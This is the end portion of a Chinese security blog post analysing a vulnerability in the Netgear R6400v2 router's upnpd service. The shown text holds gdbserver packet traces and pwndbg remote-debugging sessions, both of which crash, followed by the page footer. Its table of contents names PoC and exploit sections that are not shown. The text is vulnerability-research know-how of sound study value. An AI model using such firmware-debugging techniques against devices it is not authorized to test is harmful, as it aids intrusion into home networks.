ack]</span><br><span class="line">[sent ack]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$PacketSize</span>=3fff;QPassSignals+;QProgramSignals+;qXfer:libraries-svr4:read+;augmented-libraries-svr4-read+;qXfer:auxv:read+;qXfer:spu:read+;qXfer:spu:write+;qXfer:siginfo:read+;qXfer:siginfo:write+;qXfer:features:read+;QStartNoAckMode+;qXfer:osdata:read+;multiprocess+;QNonStop+;QDisableRandomization+;qXfer:threads:read+;ConditionalBreakpoints+;BreakpointCommands+;QAgent+#4f"</span>); [looking <span class="keyword">for</span> ack]</span><br><span class="line">[received <span class="string">'+'</span> (0x2b)]</span><br><span class="line">getpkt (<span class="string">"vMustReplyEmpty"</span>);  [sending ack]</span><br><span class="line">[sent ack]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$#00</span>"</span>); [looking <span class="keyword">for</span> ack]</span><br><span class="line">[received <span class="string">'+'</span> (0x2b)]</span><br><span class="line">getpkt (<span class="string">"QStartNoAckMode"</span>);  [sending ack]</span><br><span class="line">[sent ack]</span><br><span class="line">[noack mode enabled]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">[getpkt: discarding char <span class="string">'+'</span>]</span><br><span class="line">getpkt (<span class="string">"QProgramSignals:0;1;3;4;6;7;8;9;c;f;10;11;12;13;14;15;16;17;18;19;1a;1b;1c;1d;1e;1f;20;21;22;23;24;25;26;27;28;29;2a;2b;2c;2d;2e;2f;30;31;32;33;34;35;36;37;38;39;3a;3b;3c;3d;3e;3f;40;41;42;43;44;45;46;47;48;49;4a;4b;4c;4d;4e;4f;50;51;52;53;54;55;56;57;58;59;5a;5b;5c;5d;5e;5f;60;61;62;63;64;65;66;67;68;69;6a;6b;6c;6d;6e;6f;70;71;72;73;74;75;76;77;78;79;7a;7b;7c;7d;7e;7f;80;81;82;83;84;85;86;87;88;89;8a;8b;8c;8d;8e;8f;90;91;92;93;94;95;96;97;98;99;9a;"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"Hgp0.0"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:features:read:target.xml:0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;target&gt;&lt;architecture&gt;arm&lt;/architecture&gt;&lt;/target&gt;#06"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"QNonStop:0"</span>);  [no ack sent]</span><br><span class="line">[all-stop mode enabled]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$OK</span>#9a"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qTStatus"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$#00</span>"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"?"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$T050b</span>:0*"</span>00;0d:b0deffbe;0f:30f90a40;thread:p46bc.46bc;core:0;<span class="comment">#cc"); [noack mode]</span></span><br><span class="line">getpkt (<span class="string">"qXfer:threads:read::0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;threads&gt;</span></span><br><span class="line"><span class="string">&lt;thread id="</span>p46bc.46bc<span class="string">" core="</span>0<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">&lt;/threads&gt;</span></span><br><span class="line"><span class="string">#88"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qAttached:46bc"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$0</span>#30"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"Hc-1"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$E01</span>#a6"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qOffsets"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$#00</span>"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:libraries-svr4:read::0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;library-list-svr4 version="</span>1.0<span class="string">"/&gt;#e5"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:auxv:read::0,1000"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qXfer:libraries-svr4:read::0,fff"</span>);  [no ack sent]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$l</span>&lt;library-list-svr4 version="</span>1.0<span class="string">"/&gt;#e5"</span>); [noack mode]</span><br><span class="line">getpkt (<span class="string">"qSymbol::"</span>);  [no ack sent]</span><br><span class="line">Segmentation fault</span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">18311 admin      2492 S   upnpd-62</span><br><span class="line">18423 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62</span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>远程调试：gdbserver附加进程//here（同上</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 :1234 --attach 18792</span></span><br><span class="line">Attached; pid = 18792</span><br><span class="line">Listening on port 1234</span><br><span class="line">Remote debugging from host 192.168.10.2</span><br><span class="line">Segmentation fault</span><br><span class="line"></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62</span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">warning: .dynamic section <span class="keyword">for</span> <span class="string">"./squashfs-root/usr/lib/libnvram.so"</span> is not at the expected address (wrong library or version mismatch?)</span><br><span class="line">warning: .dynamic section <span class="keyword">for</span> <span class="string">"./squashfs-root/usr/lib/libacos_shared.so"</span> is not at the expected address (wrong library or version mismatch?)</span><br><span class="line">Reading symbols from ./squashfs-root/usr/lib/libnvram.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/usr/lib/libnvram.so:</span><br><span class="line">Remote connection closed</span><br><span class="line">Reading symbols from ./squashfs-root/usr/lib/libacos_shared.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/usr/lib/libnat.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libcrypt.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libgcc_s.so.1...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/libm.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>21Guns
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://21guns.top/2021/03/31/iot/netgear r6400v2漏洞定位及分析/" title="netgear r6400/v2漏洞定位及分析">http://21guns.top/2021/03/31/iot/netgear r6400v2漏洞定位及分析/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/路由器/" rel="tag"># 路由器</a>
              <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
              <a href="/tags/补丁对比/" rel="tag"># 补丁对比</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/03/31/iot/iot设备动态调试-总结/" rel="prev" title="iot设备动态调试-总结">
      <i class="fa fa-chevron-left"></i> iot设备动态调试-总结
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/04/09/iot/iot设备漏洞利用相关/" rel="next" title="iot设备漏洞利用相关">
      iot设备漏洞利用相关 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#netgear-r6400-v2漏洞定位及分析"><span class="nav-number">1.</span> <span class="nav-text">netgear-r6400/v2漏洞定位及分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#通告"><span class="nav-number">1.1.</span> <span class="nav-text">通告</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#准备"><span class="nav-number">1.2.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞点"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其它"><span class="nav-number">1.4.</span> <span class="nav-text">其它</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序执行"><span class="nav-number">1.5.</span> <span class="nav-text">程序执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poc"><span class="nav-number">1.6.</span> <span class="nav-text">poc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.7.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">21Guns</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">164</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">71</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">21Guns</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

</body>
</html>
